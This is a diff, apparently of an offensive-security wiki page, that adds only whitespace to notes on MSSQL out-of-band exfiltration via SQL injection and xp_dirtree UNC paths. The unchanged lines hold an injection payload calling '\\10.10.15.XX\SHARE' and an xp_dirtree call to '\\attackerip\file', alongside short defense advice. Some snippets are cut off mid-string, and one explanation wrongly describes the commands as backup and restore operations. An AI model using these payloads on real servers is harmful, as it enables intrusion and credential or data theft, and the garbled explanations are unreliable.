@@ -37,11 +37,15 @@ To execute this attack, the attacker must first gain access to the MSSQL databas
 
 This technique can be used to steal sensitive data such as credentials, intellectual property, and customer data. It can also be used to perform reconnaissance on the target network.
 
+ 
+
 ## Requirements
 
 1. Access to a MSSQL database through a SQL Injection vulnerability
 
 1. Outbound SMB connections allowed
+
+ 
 
 ## Defense
 
@@ -51,6 +55,8 @@ This technique can be used to steal sensitive data such as credentials, intellec
 
 1. Monitor network traffic for suspicious activity such as large amounts of data being transferred over SMB
 
+ 
+
 ## Objectives
 
 1. Exfiltrate sensitive data from a MSSQL database
@@ -59,13 +65,23 @@ This technique can be used to steal sensitive data such as credentials, intellec
 
 1. Perform reconnaissance on the target network
 
+ 
+
 # Instructions
 
 1. The xp_dirtree command in MSSQL is used to enumerate the directory structure of a specified path. It takes two arguments: the first argument is the path to the directory you want to enumerate and the second argument is the depth of the enumeration. 
 
+ 
+
+
+
 **Code**: [[xp_dirtree]]
 
+
+
 > To use this command, you must have the necessary permissions to execute it. Once executed, the command will return a table with the directory structure of the specified path. This information can be useful for reconnaissance purposes and can help identify potential targets for further exploitation.
+
+
 
 **Command** ([[List all files and folders in directory]]):
 
@@ -73,17 +89,31 @@ This technique can be used to steal sensitive data such as credentials, intellec
 xp_dirtree <directory>
 ```
 
+
+
 2. To list files on a remote share, run this SQL command. Make sure to replace '10.10.15.XX' with the IP address of the remote machine and 'SHARE' with the name of the shared folder.
 
+ 
+
+
+
 **Code**: [[1'; use master; exec xp_dirtree '\\10.10.15.XX\SHA]]
+
+
 
 > This command executes the 'xp_dirtree' extended stored procedure which lists the contents of a directory. The '\\10.10.15.XX\SHARE' argument specifies the remote share to list files from. The '--' at the end of the command is a comment that ignores the rest of the SQL statement, preventing any errors that may occur.
 
 3. Please execute these commands with caution as they can potentially cause data loss or corruption.
 
+ 
+
+
+
 **Code**: [[xp_dirtree '\\attackerip\file'
 
 This command retur]]
+
+
 
 > The provided commands are used to perform various backup and restore operations on a SQL Server database. The xp_dirtree and xp_fileexist commands are used to check for the existence of a file or directory on a remote server. The BACKUP and RESTORE commands are used to create and restore backups of a database or transaction log. The RESTORE HEADERONLY, RESTORE FILELISTONLY, RESTORE LABELONLY, RESTORE REWINDONLY, and RESTORE VERIFYONLY commands are used to retrieve information about a backup file or to perform certain operations on the backup file.
 
@@ -108,3 +138,5 @@ This command retur]]
 - [[MSSQL Injection]]
 - [[MSSQL Out of band]]
 - [[MSSQL UNC Path]]
+
+
